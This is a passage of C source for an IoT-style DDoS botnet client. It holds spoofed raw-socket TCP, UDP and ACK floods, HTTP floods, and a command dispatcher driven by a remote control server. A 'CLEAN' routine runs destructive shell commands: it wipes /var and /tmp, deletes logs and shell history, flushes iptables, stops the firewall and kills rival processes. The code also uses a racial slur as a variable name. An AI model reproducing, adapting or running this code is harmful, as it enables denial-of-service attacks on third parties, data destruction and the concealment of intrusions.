        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(!sockfd)
        {
                return;
        }

        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
        {
                return;
        }

        in_addr_t netmask;

        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );

        unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( findRandIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

        tcph->source = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->ack_seq = 0;
        tcph->doff = 5;

        tcph->urg = 1;

        tcph->window = rand_cmwc();
        tcph->check = 0;
        tcph->urg_ptr = 0;
        tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
        tcph->check = tcpcsum(iph, tcph);

        iph->check = csum ((unsigned short *) packet, iph->tot_len);

        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        while(1)
        {
                sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                iph->saddr = htonl( findRandIP(netmask) );
                iph->id = rand_cmwc();
                tcph->seq = rand_cmwc();
                tcph->source = rand_cmwc();
                tcph->check = 0;
                tcph->check = tcpcsum(iph, tcph);
                iph->check = csum ((unsigned short *) packet, iph->tot_len);

                if(i == pollRegister)
                {
                        if(time(NULL) > end) break;
                        i = 0;
                        continue;
                }
                i++;
        }
}
void plain(unsigned char *target, int port, int timeEnd, int packetsize, int pollinterval, int spoofit) {
        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        register unsigned int pollRegister;
        pollRegister = pollinterval;    
                int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
                if(!sockfd) {
                        return;
                }
                int tmp = 1;
                if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) {
                        return;
                }
                int counter = 50;
                while(counter--) {
                        srand(time(NULL) ^ rand_cmwc());
                        init_rand(rand());
                }
                in_addr_t netmask;
                netmask = ( ~((1 << (32 - spoofit)) - 1) );
                unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
                struct iphdr *iph = (struct iphdr *)packet;
                struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
                makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( findRandIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
                udph->len = htons(sizeof(struct udphdr) + packetsize);
                udph->source = rand_cmwc();
                udph->dest = (port == 0 ? rand_cmwc() : htons(port));
                udph->check = 0;
                makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
                iph->check = csum ((unsigned short *) packet, iph->tot_len);
                int end = time(NULL) + timeEnd;
                register unsigned int i = 0;
                while(1) {
                        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
                        udph->source = rand_cmwc();
                        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
                        iph->id = rand_cmwc();
                        iph->saddr = htonl( findRandIP(netmask) );
                        iph->check = csum ((unsigned short *) packet, iph->tot_len);
                        if(i == pollRegister) {
                                if(time(NULL) > end) break;
                                i = 0;
                                continue;
                        }
                        i++;
                }
        }
void SendUDP(unsigned char *target, int port, int timeEnd, int packetsize, int pollinterval, int spoofit) {
        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        register unsigned int pollRegister;
        pollRegister = pollinterval;	
                int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
                if(!sockfd) {
                        return;
                }
                int tmp = 1;
                if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) {
                        return;
                }
                int counter = 50;
                while(counter--) {
                        srand(time(NULL) ^ rand_cmwc());
                        init_rand(rand());
                }
                in_addr_t netmask;
                netmask = ( ~((1 << (32 - spoofit)) - 1) );
                unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
                struct iphdr *iph = (struct iphdr *)packet;
                struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
                makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
                udph->len = htons(sizeof(struct udphdr) + packetsize);
                udph->source = rand_cmwc();
                udph->dest = (port == 0 ? rand_cmwc() : htons(port));
                udph->check = 0;
                makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
                iph->check = csum ((unsigned short *) packet, iph->tot_len);
                int end = time(NULL) + timeEnd;
                register unsigned int i = 0;
                while(1) {
                        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
                        udph->source = rand_cmwc();
                        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
                        iph->id = rand_cmwc();
                        iph->saddr = htonl( getRandomIP(netmask) );
                        iph->check = csum ((unsigned short *) packet, iph->tot_len);
                        if(i == pollRegister) {
                                if(time(NULL) > end) break;
                                i = 0;
                                continue;
                        }
                        i++;
                }
        }
void lynxflood(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval)
{
        register unsigned int pollRegister;
        pollRegister = pollinterval;

        struct sockaddr_in dest_addr;

        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(!sockfd)
        {
                return;
        }

        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
        {
                return;
        }

        in_addr_t netmask;

        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );

        unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( findRandIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

        tcph->source = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->ack = 1;
        tcph->syn = 1;
        tcph->psh = 1;
        tcph->ack = 1;
        tcph->urg = 1;
        tcph->window = rand_cmwc();
        tcph->check = 0;
        tcph->urg_ptr = 0;
        tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
        tcph->check = tcpcsum(iph, tcph);

        iph->check = csum ((unsigned short *) packet, iph->tot_len);

        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        while(1)
        {
                sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                iph->saddr = htonl( findRandIP(netmask) );
                iph->id = rand_cmwc();
                tcph->seq = rand_cmwc();
                tcph->source = rand_cmwc();
                tcph->check = 0;
                tcph->check = tcpcsum(iph, tcph);
                iph->check = csum ((unsigned short *) packet, iph->tot_len);

                if(i == pollRegister)
                {
                        if(time(NULL) > end) break;
                        i = 0;
                        continue;
                }
                i++;
        }
}

void ackflood(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval)
{
        register unsigned int pollRegister;
        pollRegister = pollinterval;

        struct sockaddr_in dest_addr;

        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(!sockfd)
        {
                return;
        }

        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
        {
                return;
        }

        in_addr_t netmask;

        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );

        unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( findRandIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

        tcph->source = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->ack = 1;
        tcph->window = rand_cmwc();
        tcph->check = 0;
        tcph->urg_ptr = 0;
        tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
        tcph->check = tcpcsum(iph, tcph);
        
        iph->check = csum ((unsigned short *) packet, iph->tot_len);

        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        while(1)
        {
                sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                iph->saddr = htonl( findRandIP(netmask) );
                iph->id = rand_cmwc();
                tcph->seq = rand_cmwc();
                tcph->source = rand_cmwc();
                tcph->check = 0;
                tcph->check = tcpcsum(iph, tcph);
                iph->check = csum ((unsigned short *) packet, iph->tot_len);

                if(i == pollRegister)
                {
                                if(time(NULL) > end) break;
                                i = 0;
                                continue;
                }
                i++;
        }
}

void udppbypassattack(unsigned char *target, uint16_t port, int secs) 
{
    struct sockaddr_in bypass;
    int fds = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
 
    bind(fds, (struct sockaddr *)&bypass, sizeof(bypass));
    
    bypass.sin_family = AF_INET;
    bypass.sin_port = htons(port);
    bypass.sin_addr.s_addr = inet_addr(target);
 
    time_t start = time(NULL);
    connect(fds, (struct sockaddr *)&bypass, sizeof(bypass));
 
    while(1)
    {
        uint16_t size = 0;
        int a = 0;
        char *data;
        size = 1024 + rand() % (1460 - 1024);
        data = (char *)malloc(size);
 
        for (a = 0; a < size; a++) 
        {
            data[a] = (char)(rand() & 0xFFFF);
        }
        send(fds, data, size, MSG_NOSIGNAL);
        if(time(NULL) >= start + secs) 
        {
            close(fds);
            free(data);
            exit(0);
        }
    }
    return;
}
void SendTCP(unsigned char *target, int port, int timeEnd, unsigned char *flags, int packetsize, int pollinterval, int spoofit) {
        register unsigned int pollRegister;
        pollRegister = pollinterval;
        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(!sockfd) { return; }
        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) { return; }
        in_addr_t netmask;
        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );
        unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);
        tcph->source = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->ack_seq = 0;
        tcph->doff = 5;
        if(!strcmp(flags, "ALL")) {
                tcph->syn = 1;
                tcph->rst = 1;
                tcph->fin = 1;
                tcph->ack = 1;
                tcph->psh = 1;
        } else {
                unsigned char *pch = strtok(flags, "-");
                while(pch) {
                        if(!strcmp(pch,         "SYN")) { tcph->syn = 1;
                        } else if(!strcmp(pch,  "RST")) { tcph->rst = 1;
                        } else if(!strcmp(pch,  "FIN")) { tcph->fin = 1;
                        } else if(!strcmp(pch,  "ACK")) { tcph->ack = 1;
                        } else if(!strcmp(pch,  "PSH")) { tcph->psh = 1;
                        } else {
                        }
                        pch = strtok(NULL, ",");
                }
        }
        tcph->window = rand_cmwc();
        tcph->check = 0;
        tcph->urg_ptr = 0;
        tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
        tcph->check = tcpcsum(iph, tcph);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        while(1) {
                sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
                iph->saddr = htonl( getRandomIP(netmask) );
                iph->id = rand_cmwc();
                tcph->seq = rand_cmwc();
                tcph->source = rand_cmwc();
                tcph->check = 0;
                tcph->check = tcpcsum(iph, tcph);
                iph->check = csum ((unsigned short *) packet, iph->tot_len);
                if(i == pollRegister) {
                        if(time(NULL) > end) break;
                        i = 0;
                        continue;
                }
                i++;
        }
}
int socket_connect(char *host, in_port_t port) {
	struct hostent *hp;
	struct sockaddr_in addr;
	int on = 1, sock;     
	if ((hp = gethostbyname(host)) == NULL) return 0;
	bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
	addr.sin_port = htons(port);
	addr.sin_family = AF_INET;
	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
	if (sock == -1) return 0;
	if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;
	return sock;
}
void SendOVHL7(char *host, in_port_t port, int timeEnd, int power) {
    int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
    char request[512], buffer[1], pgetData[2048];
    sprintf(pgetData, "\x00","\x01","\x02",
    "\x03","\x04","\x05","\x06","\x07","\x08","\x09",
    "\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10",
    "\x11","\x12","\x13","\x14","\x15","\x16","\x17",
    "\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e",
    "\x1f","\x20","\x21","\x22","\x23","\x24","\x25",
    "\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c",
    "\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33",
    "\x34","\x35","\x36","\x37","\x38","\x39","\x3a",
    "\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41",
    "\x42","\x43","\x44","\x45","\x46","\x47","\x48",
    "\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f",
    "\x50","\x51","\x52","\x53","\x54","\x55","\x56",
    "\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d",
    "\x5e","\x5f","\x60","\x61","\x62","\x63","\x64",
    "\x65","\x66","\x67","\x68","\x69","\x6a","\x6b",
    "\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72",
    "\x73","\x74","\x75","\x76","\x77","\x78","\x79",
    "\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80",
    "\x81","\x82","\x83","\x84","\x85","\x86","\x87",
    "\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e",
    "\x8f","\x90","\x91","\x92","\x93","\x94","\x95",
    "\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c",
    "\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3",
    "\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa",
    "\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1",
    "\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8",
    "\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf",
    "\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6",
    "\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd",
    "\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4",
    "\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb",
    "\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2",
    "\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9",
    "\xea","\xeb","\xec","\xed","\xee","\xef","\xf0",
    "\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7",
    "\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff");
    for (i = 0; i < power; i++) {
        sprintf(request, "PGET \0\0\0\0\0\0%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", pgetData, host, useragents[(rand() % 2)]);
        if (fork()) {
            while (end > time(NULL)) {
                socket = socket_connect(host, port);
                if (socket != 0) {
                    write(socket, request, strlen(request));
                    read(socket, buffer, 1);
                    close(socket);
                }
            }
           exit(0);
       }
    }
}
void SendHTTP(char *method, char *host, in_port_t port, char *path, int timeEnd, int power) {
	int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
	char request[512], buffer[1];
	for (i = 0; i < power; i++) {
		sprintf(request, "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", method, path, host, useragents[(rand() % 59)]);
		if (fork()) {
			while (end > time(NULL)) {
				socket = socket_connect(host, port);
				if (socket != 0) {
					write(socket, request, strlen(request));
					read(socket, buffer, 1);
					close(socket);
				}
			}
			exit(0);
		}
	}
}
void SendHTTPHex(char *method, char *host, in_port_t port, char *path, int timeEnd, int power) {
    int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
    char request[512], buffer[1], hex_payload[2048];
    sprintf(hex_payload, "\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xE87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B");
    for (i = 0; i < power; i++) {
        sprintf(request, "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", method, hex_payload, host, useragents[(rand() % 36)]);
        if (fork()) {
            while (end > time(NULL)) {
                socket = socket_connect(host, port);
                if (socket != 0) {
                    write(socket, request, strlen(request));
                    read(socket, buffer, 1);
                    close(socket);
                }
            }
            exit(0);
        }
    }
}

void processCmd(int argc, unsigned char *argv[]) {
        if(!strcmp(argv[0], "ICMP"))
		{
                return;
        }	
		if (!strcmp(argv[0], "HTTP"))
		{
			if (argc < 6 || atoi(argv[3]) < 1 || atoi(argv[5]) < 1) return;
			if (listFork()) return;
			SendHTTP(argv[1], argv[2], atoi(argv[3]), argv[4], atoi(argv[5]), atoi(argv[6]));
			exit(0);
		}
		 if (!strcmp(argv[0], "HTTPHEX"))
        {
            if (argc < 6 || atoi(argv[3]) < 1 || atoi(argv[5]) < 1) return;
            if (listFork()) return;
            SendHTTPHex(argv[1], argv[2], atoi(argv[3]), argv[4], atoi(argv[5]), atoi(argv[6]));
            exit(0);
        }
		
        if(!strcmp(argv[0], "UDP"))
		{
			if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 1024 || (argc == 6 && atoi(argv[5]) < 1))
			{
				return;
            }
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int packetsize = atoi(argv[4]);
                int pollinterval = (argc == 6 ? atoi(argv[5]) : 10);
				int spoofed = 32;
                if(strstr(ip, ",") != NULL)
				{
					unsigned char *hi = strtok(ip, ",");
					while(hi != NULL)
					{
						if(!listFork())
						{
							SendUDP(hi, port, time, packetsize, pollinterval, spoofed);
							_exit(0);
						}
						hi = strtok(NULL, ",");
					}
                } else {
							if (listFork())
							{
								return;
							}
							SendUDP(ip, port, time, packetsize, pollinterval, spoofed);
							_exit(0);
					   }	
        }
        if(!strcmp(argv[0], "TCP"))
		{
                if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || (argc > 5 && atoi(argv[5]) < 0) || (argc == 7 && atoi(argv[6]) < 1))
				{
                        return;
				}
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                unsigned char *flags = argv[4];
                int pollinterval = argc == 7 ? atoi(argv[6]) : 10;
                int packetsize = argc > 5 ? atoi(argv[5]) : 0;
				int spoofed = 32;
                if(strstr(ip, ",") != NULL) {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL) {
                                if(!listFork()) {
                                        SendTCP(hi, port, time, flags, packetsize, pollinterval, spoofed);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } else	{
							if (listFork())
							{
								return;
							}
							SendTCP(ip, port, time, flags, packetsize, pollinterval, spoofed);
							_exit(0);
						}
        }
                if(!strcmp(argv[0], "OVH"))
        {
                if(argc < 5)
                {
                        
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int spoofed = atoi(argv[4]);

                int pollinterval = argc == 7 ? atoi(argv[6]) : 9;
                int psize = argc > 5 ? atoi(argv[5]) : 0;

                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL)
                        {
                                if(!listFork())
                                {
                                        ovhflood(hi, port, time, spoofed, psize, pollinterval);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }

                        ovhflood(ip, port, time, spoofed, psize, pollinterval);
                        _exit(0);
                }
        }
		if(!strcmp(argv[0], "STD"))
		{
			if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
			{
                return;
            }
			unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
			if(strstr(ip, ",") != NULL)
			{
				unsigned char *hi = strtok(ip, ",");
				while(hi != NULL)
				{
					if(!listFork())
					{
						SendSTD(hi, port, time);
						_exit(0);
					}
					hi = strtok(NULL, ",");
				}
            } else {
						if (listFork())
						{
							return;
						}
                        SendSTD(ip, port, time);
                        _exit(0);
                   }
		}
                if(!strcmp(argv[0], "STDHEX"))
	{
		if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
		{
			return;
		}
		unsigned char *ip = argv[1];
		int port = atoi(argv[2]);
		int time = atoi(argv[3]);
		if(strstr(ip, ",") != NULL)
		{
			unsigned char *niggas = strtok(ip, ",");
			while(niggas != NULL)
			{
				if(!listFork())
				{
					SendSTDHEX(niggas, port, time);
					_exit(0);
				}
				niggas = strtok(NULL, ",");
			}
		} else {
			if (listFork()) { return; }
			SendSTDHEX(ip, port, time);
			_exit(0);
		}
	}
        if(!strcmp(argv[0], "KPAC"))
        {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    SendKPAC(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            SendKPAC(ip, port, time);
            _exit(0);
        }
    }
        if(!strcmp(argv[0], "BYPASS")) 
        {
                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) 
                {
                        return;
                } 
                
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                if(strstr(ip, ",") != NULL) 
                {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL) 
                        {
                                if(!listFork()) 
                                {
                                        udppbypassattack(hi, port, time);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } 
                else 
                {
                        if (listFork()) { return; }
                        udppbypassattack(ip, port, time);
                        _exit(0);
                }
        }
        
        if(!strcmp(argv[0], "ACK"))
        {
                
                if(argc < 6)
                {
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int spoofed = atoi(argv[4]);

                int pollinterval = argc == 7 ? atoi(argv[6]) : 10;
                int psize = argc > 5 ? atoi(argv[5]) : 0;

                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL)
                        {
                                if(!listFork())
                                {
                                        ackflood(hi, port, time, spoofed, psize, pollinterval);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } 
                else 
                {
                        if (listFork()) { return; }
                        ackflood(ip, port, time, spoofed, psize, pollinterval);
                        _exit(0);
                }
        }
                
        if(!strcmp(argv[0], "LYNX"))
        {
                
                if(argc < 6)
                {            
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int spoofed = atoi(argv[4]);

                int pollinterval = argc == 7 ? atoi(argv[6]) : 10;
                int psize = argc > 5 ? atoi(argv[5]) : 0;

                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL)
                        {
                                if(!listFork())
                                {
                                        lynxflood(hi, port, time, spoofed, psize, pollinterval);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } 
                else 
                {
                        if (listFork()) { return; }
                        lynxflood(ip, port, time, spoofed, psize, pollinterval);
                        _exit(0);
                }
        }
        if(!strcmp(argv[0], "PLAIN"))
    {
        

        if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 1024 || (argc == 6 && atoi(argv[5]) < 1))
        {
            return;
        }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int packetsize = atoi(argv[4]);
            int pollinterval = (argc == 6 ? atoi(argv[5]) : 10);
            int spoofed = 32;
            if(strstr(ip, ",") != NULL)
            {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL)
                {
                    if(!listFork())
                    {
                        plain(hi, port, time, packetsize, pollinterval, spoofed);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                        if (listFork())
                        {
                            return;
                        }
                        plain(ip, port, time, packetsize, pollinterval, spoofed);
                        _exit(0);
                   }    
    }
        if (!strcmp(argv[0], "OPHEX"))
    {
        if (argc < 4 || atoi(argv[2]) > 10000 || atoi(argv[3]) < 1) return;
        if (listFork()) return;
        SendOVHL7(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]));
        exit(0);
    }	
        if(!strcmp(argv[0], "STOP"))
		{
                int killed = 0;
                unsigned long i;
                for (i = 0; i < numpids; i++)
				{
                        if (pids[i] != 0 && pids[i] != getpid())
						{
                                kill(pids[i], 9);
                                killed++;
                        }
                }
                if(killed > 0)
				{
					
                } else {
							
					   }
        }
        if(!strcmp(argv[0], "EXITFAG"))
		{
                exit(0);
        }
        if(!strcmp(argv[0], "UPDATE"))
		{
            UpdateNameSrvs();
		sockprintf(mainCommSock, "[Updating] [%s:%s]", getBuild(), getEndianness());
        }
        if(!strcmp(argv[0], "CLEAN"))
		{
            RemoveTempDirs();
		sockprintf(mainCommSock, "[Cleaning] [%s:%s]", getBuild(), getEndianness());
        }
}
int initConnection() {
    unsigned char server[512];
	memset(server, 0, 512);
	if(mainCommSock) { close(mainCommSock); mainCommSock = 0; }
	if(currentServer + 1 == SERVER_LIST_SIZE) currentServer = 0;
	else currentServer++;
	strcpy(server, commServer[currentServer]);
	int port = 23;
	if(strchr(server, ':') != NULL) {
		port = atoi(strchr(server, ':') + 1);
		*((unsigned char *)(strchr(server, ':'))) = 0x0;
	}
	mainCommSock = socket(AF_INET, SOCK_STREAM, 0);
	if(!connectTimeout(mainCommSock, server, port, 30)) return 1;
	return 0;
}
void UpdateNameSrvs() {
    uint16_t fhandler = open("/etc/resolv.conf", O_WRONLY | O_TRUNC);
    if (access("/etc/resolv.conf", F_OK) != -1) {
        const char* resd = "nameserver 8.8.8.8\nnameserver 8.8.4.4\n";
        size_t resl = strlen(resd);
        write(fhandler, resd, resl);
	} else { return; }
    close(fhandler);
}
void RemoveTempDirs() {
	system("rm -rf /tmp/* /var/* /var/run/* /var/tmp/*");
	system("rm -rf /var/log/wtmp");
	system("rm -rf /tmp/*");
	system("rm -rf /bin/netstat");
	system("iptables -F");
	system("pkill -9 busybox");
	system("pkill -9 perl");
	system("pkill -9 python");
	system("service iptables stop");
	system("/sbin/iptables -F; /sbin/iptables -X");
	system("service firewalld stop");
	system("rm -rf ~/.bash_history");
	system("history -c;history -w");
}
int getEndianness(void)
{
	union
	{
